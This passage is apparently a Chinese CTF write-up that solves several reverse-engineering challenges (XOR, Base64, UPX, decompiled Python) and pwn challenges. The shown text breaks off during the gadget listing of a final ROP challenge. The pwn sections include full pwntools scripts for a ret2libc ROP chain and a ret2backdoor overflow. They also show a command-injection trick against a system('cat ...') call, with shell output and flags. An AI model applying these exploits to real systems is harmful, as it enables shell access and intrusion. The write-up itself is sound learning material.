.text:00000000004018DA                 call    puts
.text:00000000004018DF                 lea     rax, [rbp+0A0h+Str1]
.text:00000000004018E3                 mov     rdx, rax
.text:00000000004018E6                 lea     rcx, Format     ; "%s"
.text:00000000004018ED                 call    scanf
.text:00000000004018F2                 xor     ecx, ecx
.text:00000000004018F4                 cmp     ecx, 0
.text:00000000004018F7                 jnz     short near ptr loc_4018FB+1
.text:00000000004018F9                 jz      short near ptr loc_4018FB+1
.text:00000000004018FB
.text:00000000004018FB loc_4018FB:                             ; CODE XREF: main+39↑j
.text:00000000004018FB                                         ; main+3B↑j
.text:00000000004018FB                 call    near ptr 0FFFFFFFFA085A648h
.text:0000000000401900                 mov     rcx, rax
.text:0000000000401903                 call    sub_401550
.text:0000000000401908                 lea     rax, [rbp+0A0h+Str1]
.text:000000000040190C                 lea     rdx, Str2       ; "WFNXQ1RGe24wd195MHVfa24wd19mbDB3M3JfYzB"...
.text:0000000000401913                 mov     rcx, rax        ; Str1
.text:0000000000401916                 call    strcmp
.text:000000000040191B                 test    eax, eax
.text:000000000040191D                 jnz     short loc_40192D
.text:000000000040191F                 lea     rcx, aYouWin    ; "you win!"
.text:0000000000401926                 call    printf
.text:000000000040192B                 jmp     short loc_401939
```

这里直接就能看到`WFNXQ1RGe24wd195MHVfa24wd19mbDB3M3JfYzB`Base64解码一下得到`XSWCTF{n0w_y0u_kn0w_fl0w3r_c0`其实，我是觉得这很不好的，这显然可以爆破flag了，或者如果不爆破的话，根据leet的语法很容易猜到最后一个单词是code直接就补上`d3}`了

好了，我们先看一下汇编代码，不用看懂，看到这里爆红了

```nasm
.text:00000000004018FB                 call    near ptr 0FFFFFFFFA085A648h
```

按`d`把这里**转数据**直接就这样了

```nasm
.text:00000000004018F9 ; ---------------------------------------------------------------------------
.text:00000000004018FB                 db 0E8h
.text:00000000004018FC ; ---------------------------------------------------------------------------
```

？？？Just so so？直接按`F5`反汇编得到

```
WFNXQ1RGe24wd195MHVfa24wd19mbDB3M3JfYzBkM30=
```

Base64解码得到flag

**得到：**XSWCTF{n0w_y0u_kn0w_fl0w3r_c0de}



### ezxor

#### 解题过程

看到题目介绍`这个不会的拖出去`哦？这么狂？**那我就不会~**

下载解压直接扔进IDA查看源码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char Buf1[100]; // [esp+15h] [ebp-FFh] BYREF
  char Buffer[100]; // [esp+79h] [ebp-9Bh] BYREF
  _DWORD Buf2[9]; // [esp+DDh] [ebp-37h] BYREF
  char v7; // [esp+101h] [ebp-13h]
  _WORD v8[5]; // [esp+102h] [ebp-12h] BYREF
  int i; // [esp+10Ch] [ebp-8h]

  __main();
  strcpy((char *)v8, "xsran");
  Buf2[0] = 572858400;
  Buf2[1] = 168312378;
  Buf2[2] = 438770769;
  Buf2[3] = 223952385;
  Buf2[4] = 1577528605;
  Buf2[5] = 353446922;
  Buf2[6] = 437266265;
  Buf2[7] = 373907200;
  Buf2[8] = 190645788;
  v7 = 14;
  *(_DWORD *)&v8[3] = 37;
  puts("Welcome to XSCTF!");
  printf("Please enter the flag: ");
  fgets(Buffer, 100, (FILE *)__iob[0]._ptr);
  Buffer[strcspn(Buffer, "\n")] = 0;
  if ( strlen(Buffer) == *(_DWORD *)&v8[3] )
  {
    for ( i = 0; i < *(int *)&v8[3]; ++i )
      Buf1[i] = Buffer[i] ^ *((_BYTE *)v8 + i % 5u);
    if ( !memcmp(Buf1, Buf2, *(size_t *)&v8[3]) )
      puts("Congratulations! You've got the flag! ");
    else
      puts("Sorry, that's not the correct flag.");
    return 0;
  }
  else
  {
    puts("Input length mismatch!");
    return 1;
  }
}
```

一个简单的**亦或**

```c
for ( i = 0; i < *(int *)&v8[3]; ++i )
    Buf1[i] = Buffer[i] ^ *((_BYTE *)v8 + i % 5u);
```

逆一下

```python
for ( i = 0; i < 37; ++i )
    flag[i] = encrypted_bytes[i] ^ key[i % 5];
```

写一个简单的脚本

```python
import sys

key = [0x78, 0x73, 0x72, 0x61, 0x6E]
buf2_dwords = [
    572858400,
    168312378,
    438770769,
    223952385,
    1577528605,
    353446922,
    437266265,
    373907200,
    190645788
]

target_bytes = []
for dw in buf2_dwords:
    bytes4 = dw.to_bytes(4, byteorder='little')
    target_bytes.extend(bytes4)

target_bytes.append(14)

if len(target_bytes) != 37:
    print(f"Error: Expected 37 bytes, got {len(target_bytes)} bytes")
    sys.exit(1)

flag = []
for i in range(37):
    key_byte = key[i % 5]
    flag_byte = target_bytes[i] ^ key_byte
    flag.append(chr(flag_byte))

print(''.join(flag))
```

运行解密脚本

```cmd
C:\Users\probie\Desktop\writeup\ezxor>python decrypt_flag.py
XSWCTF{x0r_is_7un_f0r_ct7_cha11eng3s}
```

**得到：**XSWCTF{x0r_is_7un_f0r_ct7_cha11eng3s}



### C4

#### 解题过程

下载解压得到`C4.exe`这个图标看起来好眼熟，看一下是什么文件

```shell
probie@Probie:/mnt/d/Downloads/C4$ file C4.exe
C4.exe: PE32+ executable (GUI) x86-64, for MS Windows, 7 sections
```

不知道怎么了突然就想到了pyc了，本能的就开始直接反编译了

```cmd
D:\Environment\pyinstxtractor\2025.2>python pyinstxtractor.py C4.exe
[+] Processing C4.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 8786598 bytes
[+] Found 980 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth__tkinter.pyc
[+] Possible entry point: C4.pyc
[+] Found 81 files in PYZ archive
[+] Successfully extracted pyinstaller archive: C4.exe

You can now use a python decompiler on the pyc files within the extracted directory

D:\Environment\pyinstxtractor\2025.2>cd C4.exe_extracted

D:\Environment\pyinstxtractor\2025.2\C4.exe_extracted>uncompyle6 C4.pyc > C4.py
```

查看C4.py

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: C4.py
import tkinter as tk, base64, hashlib

def generate_code(username):
    rev = username[None[None:-1]]
    xor = "".join([chr(ord(c) ^ 7) for c in rev])
    code = base64.b64encode(xor.encode()).decode()
    md5 = hashlib.md5()
    md5.update(code.encode())
    return md5.hexdigest()


def check():
    username = entry_user.get()
    regcode = entry_code.get()
    if username == "XSWCTF":
        expected = generate_code(username)
        if regcode == expected:
            label_result.config(text="注册成功！")
        else:
            label_result.config(text="注册码错误。")
    else:
        label_result.config(text="用户名错误。")


root = tk.Tk()
root.title("XSWCTF 注册机")
root.geometry("250x100")
tk.Label(root, text="用户名:").grid(row=0, column=0)
entry_user = tk.Entry(root)
entry_user.grid(row=0, column=1)
tk.Label(root, text="注册码:").grid(row=1, column=0)
entry_code = tk.Entry(root)
entry_code.grid(row=1, column=1)
btn = tk.Button(root, text="注册", command=check)
btn.grid(row=2, column=0, columnspan=2)
label_result = tk.Label(root, text="用户名是XSWCTF，那么注册码是什么呢？")
label_result.grid(row=3, column=0, columnspan=2)
root.mainloop()

# okay decompiling C4.pyc
```

写一个解密脚本

```python
import base64
import hashlib

def generate_code(username):
    rev = username[::-1]
    print(f"反转用户名 → {rev}")

    xor_result = "".join([chr(ord(c) ^ 7) for c in rev])
    print(f"异或7 → {xor_result}")

    b64_encoded = base64.b64encode(xor_result.encode("utf-8")).decode("utf-8")
    print(f"Base64编码 → {b64_encoded}")

    md5_obj = hashlib.md5()
    md5_obj.update(b64_encoded.encode("utf-8"))
    md5_result = md5_obj.hexdigest()
    print(f"MD5 → {md5_result}")

    return md5_result

username = "XSWCTF"
reg_code = generate_code(username)

print(f"XSWCTF{{{reg_code}}}")
```

运行解密脚本

```cmd
C:\Users\probie\Desktop\writeup\C4>python payload.py
反转用户名 → FTCWSX
异或7 → ASDPT_
Base64编码 → QVNEUFRf
MD5 → a6ad8691fc6b06eee41bd7a8bb60c82e
XSWCTF{a6ad8691fc6b06eee41bd7a8bb60c82e}
```

**得到：**XSWCTF{a6ad8691fc6b06eee41bd7a8bb60c82e}



### 脚本小子tk

#### 解题过程

脚本小子？我不是脚本小子怎么办？**有点慌...**

下载解压直接扔进IDA，发现啥都没有，想到加壳了用`upx`试试刚好对应`xpu`这个题目

```cmd
D:\Downloads\xpu>upx xpu.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jul 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: xpu.exe: AlreadyPackedException: already packed by UPX

Packed 1 file: 0 ok, 1 error.
```

不是原生壳，看看是不是衍生壳

```cmd
D:\Downloads\xpu>upx -d xpu.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jul 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     45615 <-     28207   61.84%    win32/pe     xpu.exe

Unpacked 1 file.
```

ok成了，再扔进IDA看看

直接就看到了

```nasm
.text:0040141E                 mov     dword ptr [esp+1Ch], offset aXswctf7his1s7h ; "XSWCTF{7his_1s_7h3_k3y_2_UPX}"
```

原来我是脚本小子吗？我怎么不知道？

**得到：**XSWCTF{7his_1s_7h3_k3y_2_UPX}



### 蛇口夺食

#### 解题过程

下载解压得到`snake`直接扔进IDA，发现看不出东西

直接用文本打开，发现是乱码，它是什么东西？

```shell
probie@Probie:/mnt/d/Downloads/snake$ file snake
snake: Byte-compiled Python module for CPython 3.8, timestamp-based, .py timestamp: Sun Nov  9 14:11:05 2025 UTC, .py size: 364 bytes
```

好的直接补上`.pyc`后缀名，走**pyc一把梭**

```
snake -> snake.pyc
```

```cmd
C:\Users\probie\Desktop\writeup\snake>uncompyle6 snake.pyc > snake.py
```

查看`snake.py`的源码

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: C1.py
# Compiled at: 2025-11-09 22:11:05
# Size of source mod 2**32: 364 bytes
import base64

def main():
    target = "WFNXQ1RGe1MwX3doNHRfMXNfcHljP190ZWxsbWVfdGVsbG1lfn0="
    user_input = input("Please input the flag: ")
    encoded = base64.b64encode(user_input.encode()).decode()
    if encoded == target:
        print("Correct! Well done.")
    else:
        print("Incorrect flag.")


if __name__ == "__main__":
    main()

# okay decompiling snake.pyc
```

简单的比较`WFNXQ1RGe1MwX3doNHRfMXNfcHljP190ZWxsbWVfdGVsbG1lfn0`真就蟒蛇口夺食了，原来是这个意思

Base64解码得到flag

**得到：**XSWCTF{S0_wh4t_1s_pyc?_tellme_tellme~}



## Pwn

### AAAA文件读取系统

#### 解题过程

下载解压得到`pwn`还有...`111`、`222`、、、`666`？这是什么，有点小慌

先把`pwn`扔进IDA里看看

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
}

void __noreturn vuln()
{
  pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF

  puts(&s);
  puts(&byte_402030);
  system("ls");
  while ( 1 )
  {
    puts(&byte_402060);
    __isoc99_scanf(&unk_402091, file);
    if ( !strcmp(file, v1) )
      puts(&byte_402098);
    else
      pthread_create(&newthread, 0LL, cat, 0LL);
  }
}

void *__fastcall cat(void *a1)
{
  char dest[8]; // [rsp+10h] [rbp-40h] BYREF
  __int64 v3; // [rsp+18h] [rbp-38h]
  __int64 v4; // [rsp+20h] [rbp-30h]
  __int64 v5; // [rsp+28h] [rbp-28h]
  __int64 v6; // [rsp+30h] [rbp-20h]
  __int64 v7; // [rsp+38h] [rbp-18h]
  __int16 v8; // [rsp+40h] [rbp-10h]

  *(_QWORD *)dest = 544498019LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0;
  strcat(dest, file);
  system(dest);
  return 0LL;
}
```

这是什么东西？它在做什么？syetem？栈溢出？堆？基址?ret？rop？看不出来，先连接一下看看吧

```cmd
C:\Users\probie>nc 127.0.0.1 1911
缁欎綘涓闈㈢ぜo(*锟ｂ柦锟?)銉?
杩欎釜鏂囦欢澶归噷鏈変互涓嬫枃浠垛€斺€?
€?

111
222
333
444
555
666
bin
flag
lib
lib64
pwn
鎵€浠ヤ綘鎯崇煡閬撳摢涓枃浠剁殑鍐呭鍛馃槒:
cat flag
鎵€浠ヤ綘鎯崇煡閬撳摢涓枃浠剁殑鍐呭鍛馃槒:
鎶辨瓑锛屽氨鏄笉缁欎綘鐪嬭繖涓枃浠跺憿~~~~~~~~~~
鎵€浠ヤ綘鎯崇煡閬撳摢涓枃浠剁殑鍐呭鍛馃槒:
XSWCTF{a188cce0-c9f1-4f60-9053-f2d3a7b67199}
```

...好家伙

(这里CMD的中文乱码了我也不知道是怎么回事，但是如果用回kali或者其他linux虚拟机就会正常的)

**得到：**XSWCTF{a188cce0-c9f1-4f60-9053-f2d3a7b67199}



### Pikachu

#### 解题过程

下载解压直接扔进IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+Fh] [rbp-1h] BYREF

  init();
  buf = 0;
  while ( 1 )
  {
    init();
    menu();
    read(0, &buf, 1uLL);
    switch ( buf )
    {
      case '1':
        add();
        break;
      case '2':
        edit();
        break;
      case '3':
        delete();
        break;
      case '4':
        show();
        break;
      case '5':
        exit(0);
      default:
        puts(&byte_402118);
        break;
    }
  }
}

int add()
{
  _QWORD *v0; // rax
  _BYTE buf[268]; // [rsp+0h] [rbp-110h] BYREF
  int v3; // [rsp+10Ch] [rbp-4h]

  puts("input index:");
  v3 = 0;
  __isoc99_scanf();
  if ( p[0] )
  {
    LODWORD(v0) = puts("The element already exists in the array.");
  }
  else
  {
    puts("input content:");
    read(0, buf, 0x200uLL);
    v0 = p;
    p[v3] = gift;
  }
  return (int)v0;
}

...
...
```

发现在`add()`和`edit()`存在明显栈溢出，其他没什么，这里选择用`add()`

先信息搜集一下，检查一下这个文件

```shell
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ file pwn  
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=beca19574ff6ee99a6e3d1078816f1b9187c11e6, for GNU/Linux 3.2.0, not stripped
                                                  
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ checksec pwn                           
[*] '/home/kali/Desktop/ctf/Pikachu/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
```

好的，没什么问题

这道题应该是ret2，搜集一下libc的数据先

```shell
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ ropper -f pwn --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: pwn
0x00000000004011cb: pop rdi; ret; 

                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ ropper -f pwn --search "ret"         
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: pwn
0x0000000000401042: ret 0x2f; 
0x000000000040136a: ret 0xfffc; 
0x0000000000401016: ret; 

                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ objdump -d pwn | grep "puts@plt"
0000000000401020 <puts@plt-0x10>:
0000000000401030 <puts@plt>:
  4011de:       e8 4d fe ff ff          call   401030 <puts@plt>
  4011ed:       e8 3e fe ff ff          call   401030 <puts@plt>
  4011fc:       e8 2f fe ff ff          call   401030 <puts@plt>
  40120b:       e8 20 fe ff ff          call   401030 <puts@plt>
  40121a:       e8 11 fe ff ff          call   401030 <puts@plt>
  401229:       e8 02 fe ff ff          call   401030 <puts@plt>
  401238:       e8 f3 fd ff ff          call   401030 <puts@plt>
  401255:       e8 d6 fd ff ff          call   401030 <puts@plt>
  401295:       e8 96 fd ff ff          call   401030 <puts@plt>
  4012c3:       e8 68 fd ff ff          call   401030 <puts@plt>
  4012d4:       e8 57 fd ff ff          call   401030 <puts@plt>
  401329:       e8 02 fd ff ff          call   401030 <puts@plt>
  401369:       e8 c2 fc ff ff          call   401030 <puts@plt>
  401397:       e8 94 fc ff ff          call   401030 <puts@plt>
  4013a8:       e8 83 fc ff ff          call   401030 <puts@plt>
  4013fa:       e8 31 fc ff ff          call   401030 <puts@plt>
  40143a:       e8 f1 fb ff ff          call   401030 <puts@plt>
  401468:       e8 c3 fb ff ff          call   401030 <puts@plt>
  4014a7:       e8 84 fb ff ff          call   401030 <puts@plt>
  4014e7:       e8 44 fb ff ff          call   401030 <puts@plt>
  401515:       e8 16 fb ff ff          call   401030 <puts@plt>
  401526:       e8 05 fb ff ff          call   401030 <puts@plt>
  4015e2:       e8 49 fa ff ff          call   401030 <puts@plt>
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ readelf -r pwn | grep "puts"
000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ objdump -d pwn | grep "main" 
  40109b:       ff 15 37 2f 00 00       call   *0x2f37(%rip)        # 403fd8 <__libc_start_main@GLIBC_2.34>
000000000040152d <main>:
  40157a:       77 5c                   ja     4015d8 <main+0xab>
  4015a8:       eb 3d                   jmp    4015e7 <main+0xba>
  4015b4:       eb 31                   jmp    4015e7 <main+0xba>
  4015c0:       eb 25                   jmp    4015e7 <main+0xba>
  4015cc:       eb 19                   jmp    4015e7 <main+0xba>
  4015e7:       e9 57 ff ff ff          jmp    401543 <main+0x16>
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ objdump -T libc.so.6 | grep "puts"             
00000000000805a0  w   DF .text  0000000000000202  GLIBC_2.2.5 puts
0000000000144f50 g    DF .text  0000000000000550  GLIBC_2.2.5 putspent
00000000000805a0 g    DF .text  0000000000000202  GLIBC_2.2.5 _IO_puts
00000000000897e0  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked
000000000007ec30  w   DF .text  00000000000001a2  GLIBC_2.2.5 fputs
000000000007ec30 g    DF .text  00000000000001a2  GLIBC_2.2.5 _IO_fputs
00000000001384b0 g    DF .text  0000000000000302  GLIBC_2.10  putsgent
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ objdump -T libc.so.6 | grep "system"             
0000000000155550 g    DF .text  0000000000000063 (GLIBC_2.2.5) svcerr_systemerr
0000000000053110  w   DF .text  000000000000002d  GLIBC_2.2.5 system
0000000000053110 g    DF .text  000000000000002d  GLIBC_PRIVATE __libc_system
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ctf/Pikachu]
└─$ strings -a -t x libc.so.6 | grep "/bin/sh"
 1a7ea4 /bin/sh
```

得到数据

```python
pop_rdi_ret_addr = 0x4011cb 
ret_addr = 0x401016
puts_plt_addr = 0x401030
puts_got_addr = 0x404000
main_addr = 0x40152d

puts_offset = 0x805a0
system_offset = 0x53110
binsh_offset = 0x1a7ea4
```

先试试泄露puts的实际地址，计算出基址base

写一个脚本

```python
from pwn import *

r = remote("127.0.0.1", 1653)

pop_rdi_ret_addr = 0x4011cb
ret_addr = 0x401016
puts_plt_addr = 0x401030
puts_got_addr = 0x404000
main_addr = 0x40152d

puts_offset = 0x805a0
system_offset = 0x53110
binsh_offset = 0x1a7ea4

r.recvuntil(b"5.exit")
r.sendline(b'1')
r.recvuntil(b"input index:")
r.sendline(b'0')
r.recvuntil(b"input content:")

payload = b'a'*268+p32(0)+b'a'*8+p64(pop_rdi_ret_addr)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(main_addr)
r.send(payload)
r.recvline()
puts_addr = u64(r.recv(8).strip().replace(b'\n',b'').ljust(8, b'\x00'))

print(puts_addr)
```

**简单解读：**

- `b'a'*268`填满缓冲区
- `p32(0)`覆盖上面输入的int(4个字节)
- `b'a'*8`充满上一个`rdp`基址寄存器
- `p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)`ROP链

运行脚本测试一下

```
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 1653
[x] Opening connection to 127.0.0.1 on port 1653: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1653: Done
31658192324515232
[*] Closed connection to 127.0.0.1 port 1653

进程已结束，退出代码为 0

```

没问题继续getshell

继续脚本

```python
from pwn import *

r = remote("127.0.0.1", 1653)

pop_rdi_ret_addr = 0x4011cb
ret_addr = 0x401016
puts_plt_addr = 0x401030
puts_got_addr = 0x404000
main_addr = 0x40152d

puts_offset = 0x805a0
system_offset = 0x53110
binsh_offset = 0x1a7ea4

r.recvuntil(b"5.exit")
r.sendline(b'1')
r.recvuntil(b"input index:")
r.sendline(b'0')
r.recvuntil(b"input content:")

payload = b'a'*268+p32(0)+b'a'*8+p64(pop_rdi_ret_addr)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(main_addr)
r.send(payload)
r.recvline()
puts_addr = u64(r.recv(8).strip().replace(b'\n',b'').ljust(8, b'\x00'))

r.recvuntil(b"5.exit")
r.sendline(b'1')
r.recvuntil(b"input index:")
r.sendline(b'1')
r.recvuntil(b"input content:")

base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset
binsh_addr = base_addr + binsh_offset

payload = b'a'*268+p32(1)+b'a'*8+p64(pop_rdi_ret_addr)+p64(binsh_addr)+p64(ret_addr)+p64(system_addr)
r.send(payload)

r.interactive()
```

运行脚本测试一下

```
$ ls
bin
dev
flag
ld-linux-x86-64.so.2
lib
libc.so.6
pwn
$ cat flag
XSWCTF{N1Ce_TRy_c729e8504cda}
```

**得到：**XSWCTF{N1Ce_TRy_c729e8504cda}



### ezzzzz_overflow

#### 解题过程

下载解压扔进IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}

__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("what 's you name?");
  __isoc99_scanf("%s", v1);
  printf("\nhello,%s!,enjoy your pwn time!\n", v1);
  return 0LL;
}
```

**分析：**

- 这里存在栈溢出`char v1[32];`、`__isoc99_scanf("%s", v1);`
- 这里存在格式化漏洞`printf("\nhello,%s!,enjoy your pwn time!\n", v1);`

我们选择用栈溢出漏洞，然后找一下有没有后门函数

```nasm
.text:00000000004011B6                 public backdoor
.text:00000000004011B6 backdoor        proc near
.text:00000000004011B6 ; __unwind {
.text:00000000004011B6                 endbr64
.text:00000000004011BA                 push    rbp
.text:00000000004011BB                 mov     rbp, rsp
.text:00000000004011BE                 pop     rdx
.text:00000000004011BF                 lea     rax, command    ; "/bin/sh"
.text:00000000004011C6                 mov     rdi, rax        ; command
.text:00000000004011C9                 call    _system
.text:00000000004011CE                 nop
.text:00000000004011CF                 pop     rbp
.text:00000000004011D0                 retn
.text:00000000004011D0 ; } // starts at 4011B6
.text:00000000004011D0 backdoor        endp ; sp-analysis failed
```

我们这里后门地址可以直接用`0x4011BF`

简单写一个脚本

```python
from pwn import *

r = remote("127.0.0.1", 11062)

payload = b'a'*(32+8)+p64(0x4011BF)
r.sendline(payload)

r.interactive()
```

运行测试脚本

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 11062
[x] Opening connection to 127.0.0.1 on port 11062: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 11062: Done
[*] Switching to interactive mode
what 's you name?

hello,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!,enjoy your pwn time!
ls
bin
dev
flag
lib
lib64
pwn
cat flag
XSWCTF{e53e6b31-97f9-454f-b884-319f5f95fe05}
```

**得到：**XSWCTF{e53e6b31-97f9-454f-b884-319f5f95fe05}



### roprop

#### 解题过程

下载解压，根据题目提示，这道题应该不简单，先信息搜集一下

```shell
probie@Probie:/mnt/d/Downloads$ file pwn
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=65dd9833211a8ca3619c1c242c3573f1c1d6ea24, for GNU/Linux 3.2.0, not stripped
probie@Probie:/mnt/d/Downloads$ checksec --file=pwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   48 Symbols        No    0      2pwn
```

**分析：**

- linux64位小端序elf
- PIE
- NX
- Partial RELRO

然后扔进IDA里看看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  printf("welcome to xswctf!!");
  memset(buf, 0, sizeof(buf));
  puts("here is a gift.");
  printf("%p\n", gift);
  read(0, buf, 0x50uLL);
  return 0;
}
```

**分析：**

- 它这里有个很明显的栈溢出`read(0, buf, 0x50uLL);`
- 还直接给了我们`gitf`函数的地址`printf("%p\n", gift);`
- 特别注意这里的`buf[4]`是`_QWORD`相当于`buf[4*8=32]`

我打算用gift的地址减去它的偏移得到基地址然后...它没有libc我们看看没有没有后门

```c
int flag()
{
  return system("ls");
}
```

```nasm
.text:00000000000011DA                 public flag
.text:00000000000011DA flag            proc near
.text:00000000000011DA ; __unwind {
.text:00000000000011DA                 push    rbp
.text:00000000000011DB                 mov     rbp, rsp
.text:00000000000011DE                 lea     rax, command    ; "ls"
.text:00000000000011E5                 mov     rdi, rax        ; command
.text:00000000000011E8                 call    _system
.text:00000000000011ED                 nop
.text:00000000000011EE                 pop     rbp
.text:00000000000011EF                 retn
.text:00000000000011EF ; } // starts at 11DA
.text:00000000000011EF flag            endp
```

这个不重要，继续找，全局搜索`bin/sh`

```nasm
.data:0000000000004048 sh              db '/bin/sh',0
```

好了搜集一下我们ROP链需要的数据

```shell
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ readelf -s ./pwn | grep " gift"
    19: 0000000000004038    13 OBJECT  GLOBAL DEFAULT   25 gift
                                                                        
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ readelf -s ./pwn | grep " sh"  
    26: 0000000000004048     8 OBJECT  GLOBAL DEFAULT   25 sh
    
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ strings -a -t x pwn | grep "bin/sh"    
   3048 /bin/sh
    
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn | grep "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000000111a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rax + rcx - 1], 0xe0; nop word ptr [rax + rax]; ret; 
0x00000000000010d9: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rcx - 1], 0xe0; nop dword ptr [rax]; ret; 
0x000000000000100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000000010e3: add byte ptr [rax], 0; add byte ptr [rax], al; ret; 
0x0000000000001274: add byte ptr [rax], al; add byte ptr [rax], al; call 0x1060; mov eax, 0; leave; ret; 
0x000000000000127e: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x00000000000010e4: add byte ptr [rax], al; add byte ptr [rax], al; ret;                                                                        
0x000000000000127f: add byte ptr [rax], al; add cl, cl; ret; 
0x0000000000001276: add byte ptr [rax], al; call 0x1060; mov eax, 0; leave; ret; 
0x0000000000001150: add byte ptr [rax], al; call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x00000000000011e3: add byte ptr [rax], al; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011cd: add byte ptr [rax], al; mov rdi, rax; call 0x1070; nop; pop rbp; ret; 
0x0000000000001009: add byte ptr [rax], al; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x0000000000001280: add byte ptr [rax], al; leave; ret; 
0x00000000000010e6: add byte ptr [rax], al; ret; 
0x0000000000001125: add byte ptr [rax], r8b; ret; 
0x0000000000001161: add byte ptr [rcx], al; pop rbp; ret; 
0x000000000000114f: add byte ptr cs:[rax], al; call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x0000000000001281: add cl, cl; ret; 
0x0000000000001006: add eax, 0x2fc5; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000000011e0: add eax, 0xe1f; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x0000000000001013: add esp, 8; ret; 
0x0000000000001012: add rsp, 8; ret; 
0x000000000000115e: and eax, 0x100002f; pop rbp; ret; 
0x00000000000011e8: call 0x1040; nop; pop rbp; ret; 
0x0000000000001278: call 0x1060; mov eax, 0; leave; ret; 
0x00000000000011d2: call 0x1070; nop; pop rbp; ret; 
0x0000000000001152: call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
